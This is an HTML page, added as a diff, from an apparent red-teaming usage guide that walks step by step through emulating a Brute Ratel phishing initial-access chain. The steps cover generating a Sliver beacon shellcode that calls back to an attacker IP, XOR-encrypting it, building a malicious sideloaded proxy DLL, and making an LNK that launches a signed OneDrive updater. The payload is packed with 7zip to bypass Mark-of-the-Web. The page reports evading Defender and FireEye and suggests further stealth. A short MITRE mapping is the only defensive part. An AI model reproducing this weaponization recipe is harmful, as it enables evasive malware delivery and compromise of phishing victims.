@@ -1,0 +1,375 @@
+<!DOCTYPE html>
+<html class="writer-html5" lang="en" >
+<head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" /><link rel="canonical" href="http://ab8910.pages.labranet.jamk.fi/4-initial-access/phishing/dll-hijack/dll-hijack/" />
+      <link rel="shortcut icon" href="../../../../img/favicon.ico" />
+    <title>DLL Hijack - Red-Teaming Tools Usage Guide</title>
+    <link rel="stylesheet" href="../../../../css/theme.css" />
+    <link rel="stylesheet" href="../../../../css/theme_extra.css" />
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/styles/github.min.css" />
+    
+      <script>
+        // Current page data
+        var mkdocs_page_name = "DLL Hijack";
+        var mkdocs_page_input_path = "4-initial-access/phishing/dll-hijack/dll-hijack.md";
+        var mkdocs_page_url = "/4-initial-access/phishing/dll-hijack/dll-hijack/";
+      </script>
+    
+    <script src="../../../../js/jquery-3.6.0.min.js" defer></script>
+    <!--[if lt IE 9]>
+      <script src="../../../../js/html5shiv.min.js"></script>
+    <![endif]-->
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/highlight.min.js"></script>
+      <script>hljs.initHighlightingOnLoad();</script> 
+</head>
+
+<body class="wy-body-for-nav" role="document">
+
+  <div class="wy-grid-for-nav">
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side stickynav">
+    <div class="wy-side-scroll">
+      <div class="wy-side-nav-search">
+          <a href="../../../.." class="icon icon-home"> Red-Teaming Tools Usage Guide
+        </a><div role="search">
+  <form id ="rtd-search-form" class="wy-form" action="../../../../search.html" method="get">
+      <input type="text" name="q" placeholder="Search docs" title="Type search term here" />
+  </form>
+</div>
+      </div>
+
+      <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
+              <ul>
+                <li class="toctree-l1"><a class="reference internal" href="../../../..">Home</a>
+                </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Preparation</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../../../1-preparation/phases/">Attack Chain</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Reconnaissance</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../../../2-recon/hak5/hak5/">Shark Jack</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Initial Access</span></p>
+              <ul class="current">
+                  <li class="toctree-l1"><a class="reference internal" href="../../bitb/bitb/">Browser-in-Browser</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../evilnovnc/EvilnoVNC/">EvilNoVNC</a>
+                  </li>
+                  <li class="toctree-l1 current"><a class="reference internal current" href="./">DLL Hijack</a>
+    <ul class="current">
+    <li class="toctree-l2"><a class="reference internal" href="#the-original-payload">The original payload</a>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#emulating-the-initial-access-with-no-money-and-no-skills">Emulating the initial access with no money and no skills</a>
+        <ul>
+    <li class="toctree-l3"><a class="reference internal" href="#1-shellcode">1 - Shellcode</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#2-onedrivestandaloneupdater-and-finding-a-sideloadable-dll">2 - OneDriveStandaloneUpdater and finding a sideloadable DLL</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#3-dll-sideloading">3 - DLL Sideloading</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#4-modifying-the-proxy-dll">4 - Modifying the proxy DLL</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#5-lnk-file">5 - LNK file</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#6-7zip-packing">6 - 7zip packing</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#wrap-up">Wrap up</a>
+    </li>
+        </ul>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#result">Result</a>
+        <ul>
+    <li class="toctree-l3"><a class="reference internal" href="#possible-improvements">Possible improvements</a>
+    </li>
+        </ul>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#blue-team-perspective">Blue team perspective</a>
+        <ul>
+    <li class="toctree-l3"><a class="reference internal" href="#mitre-attck-matrix">MITRE ATT&amp;CK MATRIX</a>
+    </li>
+        </ul>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#sources">Sources</a>
+    </li>
+    </ul>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Local Privilege Escalation</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../../../5-local-privilege-escalation/localpotato/LocPotato/">LocalPotato</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../../../5-local-privilege-escalation/storsvc-privesc/storsvc_privesc/">StorSvc Abuse</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../../../5-local-privilege-escalation/sigflip/sigflip/">SigLoader</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Command and Control</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../../../5-local-privilege-escalation/sliver/sliver/">Sliver</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Credential Access</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../../../3-resource-development/keepass-password-dumper/keepass/">Keepass Password Dumper</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Domain Privilege Escalation</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../../../7-privilege-escalation/sam-the-admin/sam-the-admin/">SAM the Admin</a>
+                  </li>
+              </ul>
+      </div>
+    </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+      <nav class="wy-nav-top" role="navigation" aria-label="Mobile navigation menu">
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../../../..">Red-Teaming Tools Usage Guide</a>
+        
+      </nav>
+      <div class="wy-nav-content">
+        <div class="rst-content"><div role="navigation" aria-label="breadcrumbs navigation">
+  <ul class="wy-breadcrumbs">
+    <li><a href="../../../.." class="icon icon-home" alt="Docs"></a> &raquo;</li>
+          <li>Initial Access &raquo;</li>
+      <li>DLL Hijack</li>
+    <li class="wy-breadcrumbs-aside">
+    </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+            <div class="section" itemprop="articleBody">
+              
+                <h1 id="initial-access-by-using-dll-sideloading-and-abusing-signed-binaries">Initial access by using DLL sideloading and abusing signed binaries</h1>
+<p>This post showcases an attempt to emulate the initial access payload demonstrated in PaloAltoNetworks Unit42's <a href="https://unit42.paloaltonetworks.com/brute-ratel-c4-tool/">blog post</a>. The payload encompasses an ISO file containing on-disk shellcode, DLL sideloading payloads, and an LNK file to initiate the DLL sideloading process. Certain modifications have been made to certain steps, notably the packaging method for the ISO payload, which has been addressed by Microsoft's patches.</p>
+<h2 id="the-original-payload">The original payload</h2>
+<p>Based on the Unit42 blog post, the attackers used an ISO payload with DLL sideloading, a LNK file and on-disk shellcode. The below diagram shows the attack flow:<br />
+<img alt="original attack flow" src="../images/original-payload.png" /><br />
+Image from PaloAlto Unit42 blog post.  </p>
+<p>The initial payload starts as an ISO file. This was done most likely to bypass Mark-of-the-Web security feature. The following elements are inside the ISO file after it's mounted:  </p>
+<table>
+<thead>
+<tr>
+<th><strong>TYPE</strong></th>
+<th><strong>NAME</strong></th>
+<th><strong>DESCRIPTION</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>ISO</td>
+<td>Roshan_CV.iso</td>
+<td>ISO file that gets mounted and extracts payloads</td>
+</tr>
+<tr>
+<td>LNK</td>
+<td>Roshan-Bandara-CV-Dialog.lnk</td>
+<td>Windows shortcut file which starts OneDriveUpdater.exe through cmd.exe</td>
+</tr>
+<tr>
+<td>EXE</td>
+<td>OneDriverUpdater.exe</td>
+<td>A legitimate digitally signed Microsoft PE binary that is used to update OneDrive</td>
+</tr>
+<tr>
+<td>DLL</td>
+<td>version.dll</td>
+<td>Malicious proxy DLL that gets DLL sideloaded</td>
+</tr>
+<tr>
+<td>DLL</td>
+<td>vresion.dll</td>
+<td>Legitimate version.dll that is digitally signed by Microsoft</td>
+</tr>
+<tr>
+<td>Shellcode</td>
+<td>OneDrive.Update</td>
+<td>Shellcode that gets executed by version.dll</td>
+</tr>
+</tbody>
+</table>
+<p>The payload gets executed through the following steps:  </p>
+<ol>
+<li>The ISO file extracts all the payloads listed in the table above.  </li>
+<li>Victim user clicks the LNK file. The LNK file starts cmd.exe which then starts the OneDriveUpdater.exe.  </li>
+<li>OneDriveUpdater.exe sideloads the attacker's version.dll.  </li>
+<li>version.dll reads the shellcode (OneDrive.Update) from disk, decrypts it using XOR, and injects the shellcode into theRuntimeBroker.exe process.  </li>
+<li>Any legitimate function calls to the version.dll gets proxied to the legitimate version.dll library -vresion.dll  </li>
+</ol>
+<p>Based on the details above, let's recreate the payloads.  </p>
+<h2 id="emulating-the-initial-access-with-no-money-and-no-skills">Emulating the initial access with no money and no skills</h2>
+<h3 id="1-shellcode">1 - Shellcode</h3>
+<p>The attackers used shellcode from Brute Ratel's C4 agent. This can be substituted with anything such as CobaltStrike or Meterpreter. In this case a Sliver beacon is generated:  </p>
+<pre><code>sliver &gt; generate beacon --mtls &lt;IP&gt; -f shellcode --save /tmp/OneDrive.update
+</code></pre>
+<p>The shellcode has to be XOR encrypted. The attackers used a 28-byte key <code>jikoewarfkmzsdlhfnuiwaejrpaw</code> to encrypt the shellcode. In this repository there's a simple XOR encryption tool <code>XOR-tool.py</code> written in Python3 that can do that. Change the parameters and and run the tool inside the directory the shellcode resides.  </p>
+<h3 id="2-onedrivestandaloneupdater-and-finding-a-sideloadable-dll">2 - OneDriveStandaloneUpdater and finding a sideloadable DLL</h3>
+<p>You can obtain OneDriveStandaloneUpdater binary if you have the OneDrive installed on a machine at <code>C:\Users\&lt;user&gt;\AppData\Local\Microsoft\OneDrive</code>. Alternatively, you can download it through malshare by the IoC hashes that was listed in the Unit42's blog post. After you've got the binary, place it in a your working directory.</p>
+<p>The attackers used <code>version.dll</code> for their sideloading target. If you wish to use it, find it in <code>c:\windows\system32</code> and copy it in the same working directory. Alternatively, you can find your own sideloading target with a tool like <a href="https://github.com/Accenture/Spartacus">Spartacus</a> or by running the binary with Procmon running in the background with the following filters:  </p>
+<p><img alt="Procmon filters" src="../images/procmon-filters.jpg" />  </p>
+<p>The results show potential DLL sideloading targets:  </p>
+<p><img alt="Procmon results" src="../images/procmon-results.jpg" />  </p>
+<p>In this case, this post will show how to sideload <code>dpapi.dll</code>, which the OneDriveStandaloneUpdater binary tries to load. Copy the DLL into your working directory.  </p>
+<h3 id="3-dll-sideloading">3 - DLL Sideloading</h3>
+<p>To create the malicious proxy DLL, you can use tool such as <a href="https://github.com/Flangvik/SharpDllProxy">SharpDllProxy</a>. To use it, clone the repository and compile it. Copy over the shellcode file and the dpapi.dll file in the directory where SharpDLLProxy is. Then, run it.  </p>
+<pre><code>cp c:\windows\system32\dpapi.dll .
+.\SharpDllProxy.exe --dll .\dpapi.dll --payload .\OneDrive.Update
+</code></pre>
+<p><img alt="SharpDllProxy output" src="../images/sharpDllproxy.jpg" />  </p>
+<p>SharpDLLProxy will create a DLL and a .c file. The DLL is just a renamed dpapi.dll- rename the file to dapi.dll. Renaming the DLL is not necessary, this just mimics the filenames from the blog post.  </p>
+<p>The .c file serves as the source code that will be compiled to generate the malicious DLL file. It is necessary to make alterations to this source code in order to align with the tactics, techniques, and procedures (TTPs) employed by the attackers.  </p>
+<h3 id="4-modifying-the-proxy-dll">4 - Modifying the proxy DLL</h3>
+<p>The dpapi_pragma.c file is the file that needs to be compiled into the malicious proxy DLL - dpapi.dll. Open up Visual Studio (or any IDE) and create a Dynamic-Link Library (DLL) C++ project.  </p>
+<p><img alt="Visual studio project" src="../images/VSproject.jpg" />  </p>
+<p>The source code needs modifications to mimic the TTPs of the attackers. In the blog post, the attackers perform remote process injection using <code>NtMapViewOfSection</code> Windows API to map a memory section for the decrypted payload which gets reflected into <code>Runtimebroker.exe</code> memory space.  </p>
+<p>In this post, we will execute the shellcode inline within the <code>OneDriveStandaloneUpdater.exe</code> without the need for remote process injection. The source code for the dpapi.dll is in this repository.  </p>
+<p>If using Visual Studio, make sure the Project Charset is correctly set. Right click the project -&gt; Properties -&gt; Advanced -&gt; Character Set -&gt; Set to <code>Use Multi-byte Character Set</code> for the correct Configuration &amp; Platform.  </p>
+<p><img alt="Visual studio correct charset" src="../images/VScharset.jpg" />  </p>
+<h3 id="5-lnk-file">5 - LNK file</h3>
+<p>The LNK file is used to execute <code>OneDriveStandaloneUpdater.exe</code> with <code>cmd.exe</code>. On Windows this can be done easily by right clicking inside our working directory and clicking New -&gt; Shortcut. Right click the shortcut and click Properties.  </p>
+<p>Edit the target section to run <code>cmd.exe</code> to execute <code>OneDriveStandaloneUpdater.exe</code> binary with the line:<br />
+<code>%windir%/system32/cmd.exe /c OneDriveStandaloneUpdater.exe</code>  </p>
+<p>Change the name and the icon of the LNK file as you see fit.</p>
+<p><img alt="LNK file properties" src="../images/LNK-properties.jpg" /></p>
+<h3 id="6-7zip-packing">6 - 7zip packing</h3>
+<p>In the original payload, the attackers used ISO format to pack their payload. This was most likely done to bypass Mark-of-the-Web (MotW) security feature. Microsoft has patched the ISO packing method in their <a href="https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2022-41091">November 2022 Patch security updates</a>. In this post, we will change the packing method to use 7zip to bypass MotW security feature.  </p>
+<p><a href="https://7-zip.org/">7zip</a> is a popular open-source file archiving tool. 7zip has updated their tool to include MotW identifiers in the archived files since <a href="https://www.7-zip.org/history.txt">22.00</a> update, however, this feature is disabled by default.</p>
+<p>Have all your files in the working directory:<br />
+- OneDrive.Update - XOR encrypted shellcode<br />
+- dpapi.dll - Malicious proxy DLL
+- dapi.dll - Actual dpapi.dll that was renamed
+- OneDriveStandaloneUpdater.exe - Legitimate OneDrive updater binary
+- Roshan-Bandera-CV-Dialog.lnk - LNK file</p>
+<p>When you have all of your files in your working directory, pack your directory using 7zip. Remember to hide everything except the LNK file. You may consider password protecting the archive.</p>
+<p><img alt="7zip packing" src="../images/7zip-packing.jpg" />  </p>
+<h3 id="wrap-up">Wrap up</h3>
+<p>Now that everything is set, we have the following payload wrapped up in a 7zip archive:  </p>
+<table>
+<thead>
+<tr>
+<th><strong>TYPE</strong></th>
+<th><strong>NAME</strong></th>
+<th><strong>DESCRIPTION</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>7zip</td>
+<td>Roshan_CV.7zip</td>
+<td>7zip file that extracts the payloads</td>
+</tr>
+<tr>
+<td>LNK</td>
+<td>Roshan-Bandera-CV-Dialog.lnk</td>
+<td>Windows shortcut file which starts OneDriveStandaloneUpdater.exe through cmd.exe</td>
+</tr>
+<tr>
+<td>EXE</td>
+<td>OneDriverStandaloneUpdater.exe</td>
+<td>A legitimate digitally signed Microsoft PE binary that is used to update OneDrive</td>
+</tr>
+<tr>
+<td>DLL</td>
+<td>dpapi.dll</td>
+<td>Malicious proxy DLL that gets DLL sideloaded</td>
+</tr>
+<tr>
+<td>DLL</td>
+<td>dapi.dll</td>
+<td>Legitimate dpapi.dll that is created by Microsoft</td>
+</tr>
+<tr>
+<td>Shellcode</td>
+<td>OneDrive.Update</td>
+<td>Encrypted shellcode that gets executed by dpapi.dll</td>
+</tr>
+</tbody>
+</table>
+<p>The execution flow of this attack can be seen below.  </p>
+<p><img alt="Attack chain" src="../images/execution-flow.png" />  </p>
+<h2 id="result">Result</h2>
+<p>Send your 7zip payload to the target. The victim should right click the archived folder and click 7zip -&gt; Extract to "XYZ" and run the payload.</p>
+<p><img alt="Result video" src="./images/result.mp4" />  </p>
+<p>As seen above, our payload gets executed successfully and we get a callback from the Sliver beacon.</p>
+<p>The payload was not detected by up-to-date Microsoft Defender as of 14.06.2023<br />
+FireEye Endpoint Security Version v33.46.6 did not detect the payload.</p>
+<h3 id="possible-improvements">Possible improvements</h3>
+<p>The Sliver beacon that was used is huge (~10MB!!) consider using either a stager or another implant that is smaller in size.  </p>
+<p>The process injection technique that was used is well documented. Consider using some other technique, perform direct system calls, anti-sandboxing etc. if you wish to be more stealthy. Go crazy :D</p>
+<h2 id="blue-team-perspective">Blue team perspective</h2>
+<p>This attack heavily relies on the DLL side-loading technique. </p>
+<h3 id="mitre-attck-matrix">MITRE ATT&amp;CK MATRIX</h3>
+<p><strong>TA0001 - Initial access</strong><br />
+- T1566 - Phishing  </p>
+<p><strong>TA0002 - Execution</strong><br />
+- T1204 - User Execution
+    - T1204.002 - Malicious File  </p>
+<p><strong>TA0005 - Defence Evasion</strong><br />
+- T1564 - Hide Artifacts
+    - T1564.001 - Hidden Files and Directories
+- T1574 - Hijack Execution Flow
+    - T1574.002 - DLL Side-Loading
+- T1027 - Obfuscated files or information
+    - T1027.002 - Software Packing
+- T1553 - Subvert Trust Controls
+    - T1553.005 - Mark-of-the-Web Bypass
+- T1218 - System Binary Proxy Execution
+- T1036 - Masquerading</p>
+<p><strong>TA0011 - Command and Control</strong>
+- T1573 - Encrypted Channel</p>
+<h2 id="sources">Sources</h2>
+<p>Harbison Mike &amp; Renals Peter. 2022. When Pentest Tools Go Brutal: Red-Teaming Tool Being Abused by Malicious Actors. Unit42 PaloAltoNetworks blog.  https://unit42.paloaltonetworks.com/brute-ratel-c4-tool/  </p>
+              
+            </div>
+          </div><footer>
+    <div class="rst-footer-buttons" role="navigation" aria-label="Footer Navigation">
+        <a href="../../evilnovnc/EvilnoVNC/" class="btn btn-neutral float-left" title="EvilNoVNC"><span class="icon icon-circle-arrow-left"></span> Previous</a>
+        <a href="../../../../5-local-privilege-escalation/localpotato/LocPotato/" class="btn btn-neutral float-right" title="LocalPotato">Next <span class="icon icon-circle-arrow-right"></span></a>
+    </div>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <!-- Copyright etc -->
+  </div>
+
+  Built with <a href="https://www.mkdocs.org/">MkDocs</a> using a <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>.
+</footer>
+          
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+
+  <div class="rst-versions" role="note" aria-label="Versions">
+  <span class="rst-current-version" data-toggle="rst-current-version">
+    
+    
+      <span><a href="../../evilnovnc/EvilnoVNC/" style="color: #fcfcfc">&laquo; Previous</a></span>
+    
+    
+      <span><a href="../../../../5-local-privilege-escalation/localpotato/LocPotato/" style="color: #fcfcfc">Next &raquo;</a></span>
+    
+  </span>
+</div>
+    <script>var base_url = '../../../..';</script>
+    <script src="../../../../js/theme_extra.js" defer></script>
+    <script src="../../../../js/theme.js" defer></script>
+      <script src="../../../../search/main.js" defer></script>
+    <script defer>
+        window.onload = function () {
+            SphinxRtdTheme.Navigation.enable(true);
+        };
+    </script>
+
+</body>
+</html>
